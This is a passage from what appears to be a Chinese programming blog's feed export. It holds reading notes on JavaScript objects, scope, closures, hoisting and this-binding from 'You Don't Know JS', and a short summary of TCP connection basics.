        <content type="html"><![CDATA[<p>些内置对象从表现形式来说很像其他语言中的类型（type）或者类（class），比如 Java 中的 String 类。</p><a id="more"></a><h1 id="内置“对象”"><a href="#内置“对象”" class="headerlink" title="内置“对象”"></a>内置“对象”</h1><ul><li>String</li><li>Number</li><li>Boolean</li><li>Object</li><li>Function</li><li>Array</li><li>Date</li><li>RegExp</li><li>Error</li></ul><p>这些内置对象从表现形式来说，很像 Java 中的 String 类。<br>然而，在 JS 中，它们实际上只是内置 ** 函数 **。<br>这些内置函数可以当作构造函数，由 new 操作符使用，用来创建对应的基本数据类型的新对象。</p><p>一段代码：</p><pre><code class="javascript">var strPrimitive = &quot;I am a string&quot;;typeof strPrimitive; // &quot;string&quot;strPrimitive instanceof String; // falsevar strObject = new String( &quot;I am a string&quot; );typeof strObject; // &quot;object&quot;strObject instanceof String; // true</code></pre><p>原始值 “I am a string” 并不是一个对象，它只是一个字面量，并且是一个不可变的值。<br>如果要在这个字面量上执行一些操作，比如获取长度、访问其中某个字符等，那需要将其转换为 String 对象。<br>幸好，在必要时语言会自动把字符串字面量转换成一个 String 对象，也就是说你并不需要显式创建一个对象。比如：</p><pre><code class="javascript">var strPrimitive = &quot;I am a string&quot;;console.log( strPrimitive.length ); // 13console.log( strPrimitive.charAt( 3 ) ); // &quot;m&quot;</code></pre><p>数值类型和布尔类型也是如此</p><pre><code class="javascript">2..toFixed(2) =&gt; &quot;2.00&quot;3.1315926.toFixed(4) =&gt; &quot;3.1416&quot;</code></pre><ul><li>Date 只有构造形式，没有字面量形式。</li><li>Object，Array，Function，RegExp 无论是字面量形式还是构造形式，都是对象。</li><li>Error 对象一般是抛出异常时被自动创建</li></ul><h1 id="对象的属性"><a href="#对象的属性" class="headerlink" title="对象的属性"></a>对象的属性</h1><p>当我们说对象存储着 “属性” 时，似乎在暗示这些属性被存储在对象内部，但是这只是它的表现形式。<br>在引擎内部，这些属性的值的存储方式是多种多样的，一般并不会直接存在对象容器内部。<br>存储在对象容器内部的是这些属性的名称，它们就像 ** 指针 **（从技术角度来说就是引用）一样，指向这些值真正的存储位置。</p><h2 id="属性与函数"><a href="#属性与函数" class="headerlink" title="属性与函数"></a>属性与函数</h2><p>由于函数很容易被认为是属于某个对象，在其他语言比如 Java 中，属于对象（也被称为“类”）的函数通常<br>被称为 “方法”，因此把“属性访问” 说成是 “方法访问” 也就不奇怪了。</p><p>从技术角度，JavaScript 的函数永远不会 “属于” 一个对象。有些函数具有 this 引用，有时候这些 this 确实会指向调用位置的对象引用。但是这种用法从本质上来说并没有把一个函数变成一个“方法”，因为 this 是在运行时根据调用位置动态绑定的，所以函数和对象的关系最多也只能说是间接关系。</p><p>通过对象的属性访问方式而返回的函数和其他函数没有任何区别（除了可能发生的隐式绑定 this，就像我们刚才提到的）。</p><p>##　数组的属性</p><p>如果你试图向数组添加一个属性，但是属性名 “看起来” 像一个数字，那它会变成<br>一个数值下标（因此会修改数组的元素而不是添加一个属性）：</p><pre><code class="javascript">let a = [1,3];a[&quot;1&quot;] = 666;a =&gt; [1,666]</code></pre><h2 id="属性描述符"><a href="#属性描述符" class="headerlink" title="属性描述符"></a>属性描述符</h2><p>ES5 开始，所有的属性具备属性描述符。</p><pre><code class="javascript">var myObject = {a:2};Object.getOwnPropertyDescriptor( myObject, &quot;a&quot; );输出{    value: 2,    writable: true,    enumerable: true,    configurable: true}</code></pre><p>在创建普通属性时属性描述符会使用默认值，我们也可以使用 <code>Object.defineProperty(..)</code> 来添加一个新属性或者修改一个已有属性（如果它是 configurable）并对特性进行设置</p><h3 id="writable"><a href="#writable" class="headerlink" title="writable"></a>writable</h3><pre><code class="javascript">var myObject = {};Object.defineProperty( myObject, &quot;a&quot;, {    value: 2,    writable: false, // 不可写！    configurable: true,    enumerable: true} );myObject.a = 3;myObject.a; // 2</code></pre><p>如图，我们对于属性值的修改失败了，并且是静默的。（严格模式才会报错）</p><blockquote><p>简单来说，你可以把 <code>writable:false</code> 看作是属性不可改变，相当于你定义了一个空操作 <code>setter</code></p></blockquote><h3 id="configurable"><a href="#configurable" class="headerlink" title="configurable"></a>configurable</h3><p> 属性是可配置的，才可以使用 <code>defineProperty(..)</code> 方法来修改属性描述符。<br> 细节，一旦可配置设为 false，由于你不能再使用 <code>defineProperty(..)</code>，所以这是个单向操作。<code>delete</code> 无法删除这个属性。</p><pre><code class="javascript"> let obj = {    a: 2}Object.defineProperty(obj, &#39;a&#39;, {    configurable: false})console.log(obj.a);delete obj.a  // delete 无法删除console.log(obj.a);// 报错：TypeError: Cannot redefine property: aObject.defineProperty(obj, &#39;a&#39;, {    configurable: true})</code></pre><h3 id="enumerable"><a href="#enumerable" class="headerlink" title="enumerable"></a>enumerable</h3><p> 这个描述符控制的是属性是否会出现在对象的属性枚举时。for in 就是属性枚举。</p><h2 id="维持对象现状"><a href="#维持对象现状" class="headerlink" title="维持对象现状"></a>维持对象现状</h2><h3 id="禁止扩展"><a href="#禁止扩展" class="headerlink" title="禁止扩展"></a>禁止扩展</h3><p>禁止一个对象添加新属性并且保留已有属性 <code>Object.preventExtensions(对象)</code></p><pre><code class="javascript">let obj = {    a: 9}Object.preventExtensions(obj);obj.b = 23;obj.b // undefined</code></pre><p>非严格模式，静默失败，严格模式，TypeError</p><h3 id="更进一步-密封"><a href="#更进一步-密封" class="headerlink" title="更进一步 - 密封"></a>更进一步 - 密封</h3><p><code>Object.seal(obj)</code></p><p>密封后，无法删除属性，无法重新设置属性描述符</p><pre><code class="javascript">let obj2 = {    a: 123,}Object.seal(obj2)obj2.b = 456;console.log(&#39;obj2.b:&#39;, obj2.b);delete obj2.a;  // 密封后，不能删除已有属性console.log(&#39;obj2.a:&#39;, obj2.a);Object.defineProperty(obj2, &quot;a&quot;, {    writable: false})// 密封后，不能重新配置console.log(Object.getOwnPropertyDescriptor(obj2, &quot;a&quot;));</code></pre><h3 id="更更进一步"><a href="#更更进一步" class="headerlink" title="更更进一步"></a>更更进一步</h3><p><code>Object.freeze(obj)</code></p><p>在密封的基础上，对所有对象的属性标记为 <code>writable:false</code>。<br>这个方法是应用在对象上的级别最高的不可变性，它会进制对于对象本身及其任意直接属性的修改（当然，这个对象引用的其他对象不受影响）。<br>所以，这个冻结是“浅冻结”。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可靠数据传输原理</title>
      <link href="2021/08/11/ke-kao-shu-ju-chuan-shu-yuan-li/"/>
      <url>2021/08/11/ke-kao-shu-ju-chuan-shu-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>可靠数据传输为上层包保证：数据可以通过一条可靠的信道进行传输。</p><a id="more"></a><p>TCP 是在不可靠的端到端网络上实现的可靠数据传输协议，因此可以将较低层直接视为不可靠的点对点信道。</p><ul><li>TCP 是面向连接的，是因为在一个应用进程可以开始向另一个应用进程 ** 发送数据之前 **，这两个进程必须先进行“握手”。就是说，它们必须相互发送某些预备报文段，以建立确保数据传输相关的参数。</li><li>TCP 的 “连接” 不是一条真实的线路，而是 ** 逻辑上的连接 **，连接的状态仅仅在两个通信端的系统的 TCP 程序中会保留，而中间的网络元素（路由器和链路层交换机）不会维持这个 TCP 连接，因为他们看到的只是数据包。</li><li>TCP 连接提供 ** 全双工 ** 的服务：一台主机的进程 A 与另一台主机的进程 B 存在 TCP 连接时，应用层的数据可以由进程 A→进程 B 的同时进程 B→进程 A。</li><li>TCP 连接总是在单个发送方和单个接收方的连接。** 点对点 **。多播（一个发送方，多个接收方）是不可能的。</li></ul><h2 id="发送数据前的三次握手"><a href="#发送数据前的三次握手" class="headerlink" title="发送数据前的三次握手"></a>发送数据前的三次握手</h2><ol><li>首先，客户首先发送特殊的 TCP 报文段，</li><li>服务器用另一个特殊的 TCP 报文段来响应</li><li>客户再用第三个特殊报文段作为响应。</li><li>前两个报文段不承载应用层数据</li><li>第三个报文段可以承载应用层数据</li></ol><h2 id="发送数据的情况："><a href="#发送数据的情况：" class="headerlink" title="发送数据的情况："></a>发送数据的情况：</h2><ol><li>客户机进程通过套接字传递数据流</li><li>数据流过套接字后，数据就全权交给 TCP 程序控制</li><li>TCP 将数据引导至该 TCP 连接 的发送缓存（send buffer）中，发送缓存是发起三次握手期间设置的多个缓存中的一个</li><li>接下来，TCP 不时从缓存中取出数据，并将数据传递到网络层。</li><li>TCp 从缓存中取出并放入报文段中的数据数量受限于 ** 最大报文段长度（MSS）（不包括 TCP 首部长度）**</li><li>MSS 一般由最大链路层帧长度（MTU）设置。MSS 要保证一个 TCP 报文段加上 TCP，IP 首部长度（一般 40 字节）后适合单个链路层帧。以太网链路层协议具有 1500 字节的 MTU，因此 MSS 典型值为 1460 字节。</li></ol><blockquote><p>计算机网络(第七版)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>词法作用域 - 你不知道的 JS</title>
      <link href="2021/08/11/ci-fa-zuo-yong-yu/"/>
      <url>2021/08/11/ci-fa-zuo-yong-yu/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>在传统编译语言的流程中，程序中的一段源代码在执行之前会经历三个步骤，统称为“编译”。<br>编译可以分为三个阶段</p><ol><li>词法分析。例如，<code>var a = 2;</code> 这段代码通常会被分解成为下面这些词法单元：<code>var</code>、<code>a</code>、<code>=</code>、<code>2</code> 、<code>;</code></li><li>语法分析。这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST）<a href="https://astexplorer.net/" target="_blank" rel="noopener">在线生成 AST</a><br> <img src="/images/post-images/1628667972362.png" alt=""></li><li>代码生成。将 AST 转换为可执行代码的过程被称为代码生成。简单来说就是有某种方法可以将 <code>var a = 2;</code> 的 AST 转化为一组机器指令，用来创建一个叫作 a 的变量（包括分配内存等），并将一个值储存在 a 中。</li></ol><h1 id="词法阶段"><a href="#词法阶段" class="headerlink" title="词法阶段"></a>词法阶段</h1><h2 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h2><p>词法作用域就是定义在词法阶段的作用域。<br>换句话说，词法作用域是由你在写代码时将变量和块作用域写在哪里来决定的，因此当词法分析器处理代码时会保持作用域不变（大部分情况下是这样的）。</p><pre><code class="javascript">function foo(a) {    var b = a * 2;    function bar(c) {    console.log( a, b, c );}bar( b * 3 );}foo( 2 ); // 2, 4, 12</code></pre><p>代码中有三个作用域。<br><img src="/images/post-images/1628668166714.png" alt=""></p><ol><li>全局作用域，只有一个 foo 标识符</li><li>foo 创建的作用域，三个标识符，a b c</li><li>bar 创建的作用域，一个标识符，c</li></ol><p>这三个作用域由其对应的作用域块代码写在哪里决定，它们是逐级包含的。而且是严格包含，没有哪个作用域同时出现在两个作用域里。</p><h2 id="查找范围"><a href="#查找范围" class="headerlink" title="查找范围"></a>查找范围</h2><p>作用域查找会在找到第一个匹配的标识符时停止。在多层的嵌套作用域中可以定义同名的标识符，这叫作 “遮蔽效应”（内部的标识符“遮蔽” 了外部的标识符）。抛开遮蔽效应，作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，直到遇见第一个匹配的标识符为止。</p><blockquote><p>无论函数在哪里被调用，也无论它如何被调用，它的词法作用域都只由函数被声明时所处的位置决定。</p></blockquote><p>词法作用域查找只会查找一级标识符，比如 a、b 和 c。如果代码中引用了 <code>foo.bar.baz</code> 这种，词法作用域查找只会试图查找 <code>foo</code> 标识符，找到这个变量后，** 对象属性访问规则 ** 会分别接管对 bar 和 baz 属性的访问。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作用域与闭包 - 你不知道的 JS</title>
      <link href="2021/08/11/zuo-yong-yu-bi-bao/"/>
      <url>2021/08/11/zuo-yong-yu-bi-bao/</url>
      
        <content type="html"><![CDATA[<p>闭包的神话故事。需要先看“词法作用域”。</p><a id="more"></a><p>闭包是基于词法作用域书写代码时所产生的 ** 自然结果 **，你甚至不需要为了利用它们而有意识地创建闭包。<br>闭包的创建和使用在你的代码中随处可见。你缺少的是根据你自己的意愿来识别、拥抱和影响闭包的思维环境。</p><h1 id="实质"><a href="#实质" class="headerlink" title="实质"></a>实质</h1><p>当函数可以记住并访问所在的词法作用域时，就产生了闭包，** 即使函数是在当前的词法作用域之外执行 **<br>看下面代码：</p><pre><code class="javascript">function foo() {    var a = 2;    function bar() {        console.log(a); // 2    }    bar();}foo();</code></pre><p>基于词法作用域的查找规则，函数 bar() 可以访问外部作用域中的变量 a。<br>这就是闭包吗？<br>根据前面的定义，确切地说 ** 并不是 *<em>。（原因后面有解答）<br>解释 bar() 对 a 的引用的方法是：词法作用域的查找规则，这些规则的确是闭包的 *</em> 一部分 **。<br>在上面的代码片段中，函数 bar() 具有一个涵盖 foo() 作用域的闭包。<br>为什么呢？原因简单明了，因为 bar() 嵌套在 foo() 内部。</p><p>你之前学得可能只有以上那么多。<br>但是通过这种方式定义的闭包并不能直接进行 ** 观察 **，也无法明白在这个代码片段中闭包是<br>如何工作的。<br>我们可以很容易地理解词法作用域，而闭包则隐藏在代码之后的神秘阴影里，并不那么容易理解。</p><p>一段真正的闭包代码：</p><pre><code class="javascript">function foo() {    var a = 2;    function bar() {        console.log(a);    }    return bar;}var bazz = foo();bazz(); // 2</code></pre><p>函数 bazz() 的 ** 词法作用域 ** 能够访问 foo() 的内部作用域。这和前面的例子一样。<br>然后，我们将 bar 函数本身当作一个值类型作为返回值。<br>foo()执行后，返回值是内部的 bar 函数，赋值给了 bazz 变量并调用 bazz()，实际上是通过不同的标识符引用去调用 foo 函数内部的函数 bar。</p><blockquote><p>重点是，bar()函数虽然被正常执行，但是是 ** 在定义时的词法作用域以外的地方被执行 **</p></blockquote><p>通常外部函数被执行后，我们会认为其内部作用域的相关变量，函数在某个时间嘛就会被 JS 引擎的垃圾回收器释放。foo 函数内的变量看上去不会再被使用，所以 JS 引擎会考虑对其进行回收。</p><p>事实是，闭包的 “神奇” 之处正是可以阻止这件事情的发生。内部作用域依然存在，因此没有被回收。<br>谁在使用这个内部作用域？显然是 bar() 本身在使用。</p><p>拜 bar() 所声明的位置所赐，它拥有涵盖 foo() 内部作用域的闭包，使得该作用域能够一直存活，以供 bar() 在之后任何时间进行引用。bar() 永久持有对该作用域的引用，而这个引用就叫作闭包。</p><p>bazz()执行时，就可以访问 bar 函数定义时的 ** 词法作用域 **，因此可以自由地访问变量 a。</p><blockquote><p>闭包使得函数可以继续访问定义时的 ** 词法作用域 *<em>，即使函数已经不在 *</em> 词法作用域 ** 内。</p></blockquote><p>一开始的代码不是真正的闭包的原因，现在可以解答了，是因为 bar 的执行还是在 bar 的 ** 词法作用域 ** 内。</p><p>闭包并不一定非得像上面那样，无论何种方式对函数类型的值进行传递皆可以。<br>例如</p><pre><code class="javascript">var fn;function foo() {    var a = 2;    function baz() {        console.log(++a);    }    fn = baz; // 将 baz 分配给全局变量}foo();fn();  // 3fn(); // 4</code></pre><h1 id="懂？"><a href="#懂？" class="headerlink" title="懂？"></a>懂？</h1><p>setTimeout 就是闭包的例子。</p><pre><code class="javascript">function wait(message) {    setTimeout( function timer() {        console.log( message );    }, 1000 );}wait( &quot;Hello, closure!&quot; );</code></pre><p>函数 timer 在函数 wait 内部，将内部函数 timer 传递给了 setTimeout。此时 timer 是在 wait 的词法作用域内，可以使用 message 变量。<br>在 <code>wait( &quot;Hello, closure!&quot; );</code> 被执行 1000ms 后，timer 函数任然保有 wait 作用域的闭包。所以此时 setTimeout 被触发执行时，可以正常打印 message 变量。<br>在引擎内部，工具函数 setTimeout 的实现内，持有对一个参数的引用 （可能叫 <code>fn</code> 或 <code>func</code>）。1000ms 后，轮到计时器被执行时，引擎会调用这个函数，而词法作用域在这个过程中保持完整。<br>这就是闭包。</p><blockquote><p>使用了回调函数，实际上就是在使用闭包！定时器、事件监听器、Ajax 请求等就是闭包。</p></blockquote><h1 id="循环和闭包"><a href="#循环和闭包" class="headerlink" title="循环和闭包"></a>循环和闭包</h1><p>经典代码：</p><pre><code class="javascript">for (var i=1; i&lt;=5; i++) {    setTimeout( function timer() {        console.log( i );    }, i*1000 );}</code></pre><p>为什么打印五次 6 ？</p><p>仔细想一下，这好像又是显而易见的，延迟函数的回调会在循环结束时才执行。</p><p>尽管循环中的五个函数是在各个迭代中分别定义的，但是它们都被封闭在一个共享的全局作用域中，因此实际上只有一个 i。所有函数共享一个 <code>i</code>，以上代码实际上就是：</p><pre><code class="javascript">var i = 6;setTimeout( function timer() {    console.log( i );}, i * 1000 );setTimeout( function timer() {    console.log( i );}, i * 1000 );// ...</code></pre><p>引伸出一个更深入的问题，代码中到底有什么缺陷导致它的行为同语义所暗示的不一致呢？</p><blockquote><p>作用域问题</p></blockquote><p>我们需要更多的作用域，要在循环中每个迭代中创建一个闭包作用域。</p><pre><code class="javascript">for (var i=1; i &lt;=5; i++) {    (function () {        setTimeout(function timer() {            console.log(i);        }, i*1000)    })();}</code></pre><p>这样显然不行，仔细看一下，我们的 IIFE 只是一个什么都没有的空作用域。它需要包含一点实质内容才能为我们所用。<br>这个闭包作用域需要有自己的变量，用来在每个迭代中存储 i 的值：</p><pre><code class="javascript">for (var i=1; i&lt;=5; i++) {    (function() {        var j = i;        setTimeout( function timer() {            console.log( j );        }, j*1000 );    })();}// 依次打印 1,2,3,4,5</code></pre><p>或者：</p><pre><code class="javascript">for (var i=1; i&lt;=5; i++) {    (function(j) {        setTimeout( function timer() {            console.log( j );        }, j*1000 );    })( i );}// 依次打印 1,2,3,4,5</code></pre><h2 id="块作用域"><a href="#块作用域" class="headerlink" title="块作用域"></a>块作用域</h2><p>块作用域是一个可以被关闭的作用域。</p><p>因此，下面这些看起来很酷的代码就可以正常运行了：</p><pre><code class="javascript">for (var i=1; i&lt;=5; i++) {    let j = i; // 是的，闭包的块作用域！    setTimeout( function timer() {        console.log( j );    }, j*1000 );}// 依次打印 1,2,3,4,5</code></pre><p>此外，for 循环头部的 let 声明还会有一个特殊的行为，就是在那里声明的变量在循环过程中的 ** 每次迭代都会声明 **。每个迭代都会使用上一个迭代结束时的值来初始化这次迭代中声明的变量。</p><pre><code class="javascript">for (let i=1; i&lt;=5; i++) {    setTimeout( function timer() {        console.log( i );    }, i*1000 );}// 依次打印 1,2,3,4,5</code></pre><p>如果你把 let 声明写 for 循环外面，就 GG 了</p><pre><code class="javascript">let i = 1;for (; i &lt;= 5; i++) {    setTimeout(function timer() {        console.log(i);    }, i * 10);}// 打印五个 6</code></pre>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量提升 - 你不知道的 JS</title>
      <link href="2021/08/11/bian-liang-ti-sheng/"/>
      <url>2021/08/11/bian-liang-ti-sheng/</url>
      
        <content type="html"><![CDATA[<p>先有鸡还是先有蛋（现有声明再有赋值）</p><a id="more"></a><pre><code class="javascript">console.log( a );  // undefinedvar a = 2;</code></pre><ol><li>引擎会在解释 JavaScript 代码之前首先对其进行编译。</li><li>编译阶段中的一部分工作就是找到所有的声明，并用合适的作用域将它们关联起来。</li><li>正确的思考思路是，包括变量和函数在内的所有声明都会在任何代码被执行前首先被处理。</li></ol><p>当你看到 var a = 2; 时，可能会认为这是一个声明。但 JavaScript 实际上会将其看成两个<br>声明：<code>var a;</code> 和 <code>a = 2;</code>。<br>第一个定义声明是在编译阶段进行的。<br>第二个赋值声明会被留在原地等待执行阶段。</p><p>上面的代码片段会以如下形式进行处理</p><pre><code class="javascript">// 编译阶段var a;// 执行阶段console.log(a);a = 2;</code></pre><p>这个过程就好像变量和函数声明从它们在代码中出现的位置被 “移动”<br>到了最上面。这个过程就叫作 ** 提升 **。</p><p>对于函数，函数声明被提升的救过就是，可以在声明前执行。</p><pre><code class="javascript">foo();function foo() {    console.log( a ); // undefined    var a = 2;}</code></pre><blockquote><p>每个作用域都会进行提升操作</p></blockquote><p>对于函数表达式，不会存在提升。</p><pre><code class="javascript">foo(); // 不是 ReferenceError, 而是 TypeError!bar(); // ReferenceErrorwahtthefuck() // ReferenceErrorvar foo = function bar() {    // ...};</code></pre><p>变量的提升会导致报 ReferenceError，但是这里是 TypeError。<br>foo() 由于对 undefined 值进行函数调用而导致非法操作，因此抛出 TypeError 异常。<br>至于 bar()，外部作用域完全没有声明这个变量，所以报 ReferenceError</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是 Polyfill</title>
      <link href="2021/08/11/shi-me-shi-polyfill/"/>
      <url>2021/08/11/shi-me-shi-polyfill/</url>
      
        <content type="html"><![CDATA[<p>是一段代码 (或者插件) ，它提供了开发人员希望浏览器本身提供的技术。</p><a id="more"></a><p>在前端 web 工程里，使用 polyfill，，目的是为当前环境提供一个垫片。所谓垫片，是指垫平不同浏览器之间差异的东西。例如，polyfill 可以提供全局的 ES6 对象以及通过修改原型链 <code>Array.prototype</code> 等实现对实例的实现。<br>polyfill 广义上讲是为环境提供不支持的特性的一类文件或库，狭义上讲是 polyfill.js 文件以及 @babel/polyfill 这个 npm 包。<br><a href="https://www.jiangruitao.com/babel/use-polyfill/" target="_blank" rel="noopener">以上摘自 babel 教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>this 的绑定规则 - 下 - 你不知道的 JS</title>
      <link href="2021/08/10/this-de-bang-ding-gui-ze-xia/"/>
      <url>2021/08/10/this-de-bang-ding-gui-ze-xia/</url>
      
        <content type="html"><![CDATA[<p>毫无疑问，默认绑定的优先级是四条规则中最低的。显式绑定优先于隐式绑定。</p><a id="more"></a><h1 id="隐式和-new-绑定的优先级"><a href="#隐式和-new-绑定的优先级" class="headerlink" title="隐式和 new 绑定的优先级"></a>隐式和 new 绑定的优先级</h1><pre><code class="javascript">function foo(n) {    this.age = n;}var age = 999;let obj = {    age: 3,    foo}let a = new obj.foo(6666);console.log(obj.age); // 3console.log(a.age);  // 6666</code></pre><p>可以看到 new 绑定比隐式绑定优先级高。</p><h1 id="硬绑定和-new-绑定的优先级"><a href="#硬绑定和-new-绑定的优先级" class="headerlink" title="硬绑定和 new 绑定的优先级"></a>硬绑定和 new 绑定的优先级</h1><p><code>Function.prototype.bind(..)</code> 会创建一个新的包裹函数，这个函数会忽略它当前的 <code>this</code> 绑定（无论绑定的对象是什么），并把我们提供的对象绑定到 this 上。<br>看起来硬绑定优先级高于 new 绑定。</p><pre><code class="javascript">function foo(something) {    this.a = something;}var obj1 = {};var bar = foo.bind( obj1 );barr( 2 );  // 修改的是 obj 的 aconsole.log( obj1.a ); // 2var bazz = new bar(3);  console.log( obj1.a ); // obj 的 a 还是 2！！console.log( bazz.a ); // 3</code></pre><p>虽然 bar 被硬绑定到了 obj1 对象上，但是对 bar 进行 <code>new bar(3)</code> 并没有像我们预计的那样把 obj 的 a 修改为 3。就好像绑定的 this 和 new 创建的 this 不是一个 this。<br>为什么？<br>其实，是由于 bind 的 JavaScript 的内部实现，会判断 bind 后的函数是否被 new 调用，如果是的话就会创建新的 this 覆盖硬绑定的 this。</p><h1 id="绑定顺序"><a href="#绑定顺序" class="headerlink" title="绑定顺序"></a>绑定顺序</h1><ol><li>函数是否在 new 中调用（new 绑定）？如果是的话 this 绑定的是新创建的对象</li><li>否则，函数是否通过 call、apply（显式绑定）或者硬绑定调用？如果是的话，this 绑定的是指定的对象</li><li>否则，函数是否在某个上下文对象中调用（隐式绑定）？如果是的话，this 绑定的是那个上下文对象。</li><li>否则，如果都不是的话，使用默认绑定。如果在严格模式下，就绑定到 undefined，否则绑定到全局对象。</li></ol><p>不过…… 凡事总有例外。</p><h1 id="例外"><a href="#例外" class="headerlink" title="例外"></a>例外</h1><h2 id="this-被故意忽略"><a href="#this-被故意忽略" class="headerlink" title="this 被故意忽略"></a>this 被故意忽略</h2><p>你把 null 或者 undefined 作为 this 的绑定对象传入 call、apply 或者 bind，这些值<br>在调用时会被忽略，实际应用的是 ** 默认绑定规则 **</p><pre><code class="javascript">function foo() {    console.log( this.a );}var a = 2;foo.call( null ); // 2</code></pre><p>在 ES5 中，一种非常常见的做法是使用 <code>apply(..)</code> 来 “展开” 一个数组，并当作参数传入一个函数。类似地，<code>bind(..)</code> 可以对参数进行柯里化（预先设置一些参数），这种方法有时非常有用。</p><pre><code class="javascript">function foo(a,b) {    console.log( &quot;a:&quot; + a + &quot;, b:&quot; + b );}// 把数组 “展开” 成参数foo.apply( null, [2, 3] ); // a:2, b:3// 使用 bind(..) 进行柯里化var bar = foo.bind( null, 2 );bar( 3 ); // a:2, b:3</code></pre><p>如果函数并不关心 this 的话，你仍然需要传入一个占位值，这时 null 可能是一个不错的选择，就像代码所示的那样。</p><blockquote><p>只有当你确定某个函数的 this 可以执行默认绑定时，再用 bull 绑定忽略 this。</p></blockquote><p>或者，你可以使用一个真正的空对象来代替 null，作为函数的 this，避免在执行默认绑定时，影响全局的 this。<br>这个真正的空对象就是通过 <code>Object.create(null)</code> 创建的，虽然和 <code>{}</code> 很像，但是这个对象没有 prototype。</p><pre><code class="javascript">let kull = Object.create(null);kull.prototype  // undefiendlet obj = {    a :２}kull.__proto__ = obj;kull.a  // undfinedkill.a = 3kull.a // 3</code></pre><p>可以看到，这个空对象无法进行继承</p><h2 id="间接引用"><a href="#间接引用" class="headerlink" title="间接引用"></a>间接引用</h2><p>你有可能（有意或者无意地）创建一个函数的“间接引用”，在这种情况下，调用这个函数会应用默认绑定规则。</p><pre><code class="javascript">function foo() {    console.log( this.a );}var a = 2;var o = { a: 3, foo: foo };var p = { a: 4 };o.foo(); // 3(p.foo = o.foo)(); // 2</code></pre><p>赋值表达式 p.foo = o.foo 的返回值是目标函数的引用，因此调用位置是 foo() 而不是<br>p.foo() 或者 o.foo()。相当于直接调用了 foo 函数，因此执行默认绑定</p><h2 id="软绑定"><a href="#软绑定" class="headerlink" title="软绑定"></a>软绑定</h2><p>硬绑定会大大降低函数的灵活性，使用硬绑定之后就无法使用隐式绑定或者显式绑定来修改 this。</p><p>如果可以给默认绑定指定一个 ** 非全局对象和 undefined 值 **，那就可以实现和硬绑定相同的效果，同时保留隐式绑定或者显式绑定修改 this 的能力。</p><pre><code class="javascript">if (!Function.prototype.softBind) {    Function.prototype.softBind = functtion(obj) {        let fn = this;        // 得到第二个 - 最后一个参数        // 注意区分这里的 arguments 和下面的 arguments 不是一个！        // 这里的 arguments 是调用 softBind 传入的参数        let curried = Array.prototype.slice.call(arguments, 1);        let bound = function () {            return fn.apply(                // this 不存在或者 this 是全局对象，则修改 this 为你指定的 obj，否则不修改！                (!this || this === (window || global)) ?                    obj :                    this,                // 这里的 arguments 是调用 bound 函数传入的参数                curried.concat.apply(curried, arguments)            );        };        bound.prototype = Object.create(fn.prototype);        return bound;    }}</code></pre><p>除了软绑定之外，<code>softBind(..)</code> 的其他原理和 ES5 内置的 <code>bind(..)</code> 类似。它会对指定的函数进行封装，首先检查调用时的 this，如果 this 绑定到了全局对象或者 <code>undefined</code>，那就把指定的默认对象 obj 绑定到 this，否则不会修改 this。此外，这段代码还支持可选的柯里化。<br>下面我们看看 softBind 是否实现了软绑定功能：</p><pre><code class="javascript">var a = &quot;全局的 a 变量&quot;function foo() {    console.log(this.a);}let obj1 = {    a: &#39;对象 1 的 a 变量&#39;}let obj2 = {    a: &#39;对象 2 的 a 变量&#39;}let f = foo.softBind(obj1);f() // 对象 1 的 a 变量obj2.foo2 = foo.softBind(obj1);obj2.foo2()  // 对象 2 的 a 变量</code></pre><p>可以看到，软绑定时 this 可以手动改绑到 obj2 上，如果代码想应用默认绑定，则会绑定到 obj1 上，避免绑定到全局对象上。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>this 的绑定规则 - 上 - 你不知道的 JS</title>
      <link href="2021/08/10/this-he-dui-xiang-yuan-xing/"/>
      <url>2021/08/10/this-he-dui-xiang-yuan-xing/</url>
      
        <content type="html"><![CDATA[<p>函数内 this 既不指向函数自身，也不指向函数的  词法作用域。</p><a id="more"></a><p>this 实际上在函数被调用时发生绑定，this 指向什么 ** 完全 ** 取决于函数在哪里，怎样被调用。</p><h2 id="this-的默认绑定"><a href="#this-的默认绑定" class="headerlink" title="this 的默认绑定"></a>this 的默认绑定</h2><p>缺省的规则。<br>最常用的函数调用类型：** 独立函数调用 **。</p><p>有一个细节：</p><pre><code class="javascript">function foo() {    &quot;use strict&quot;;    console.log( this.a );}var a = 2;foo(); // TypeError: this is undefined</code></pre><p>只要函数的定义是严格模式，那么默认调用时，this 会绑定到全局对象上。</p><pre><code class="javascript">function foo() {    console.log( this.a );}var a = 2;(function(){    &quot;use strict&quot;;    foo(); // 2})();</code></pre><p>上面的函数定义没有在严格模式，但是执行时是在严格模式，结果 this 依旧可以绑定到全局对象上。</p><h2 id="this-的隐式绑定"><a href="#this-的隐式绑定" class="headerlink" title="this 的隐式绑定"></a>this 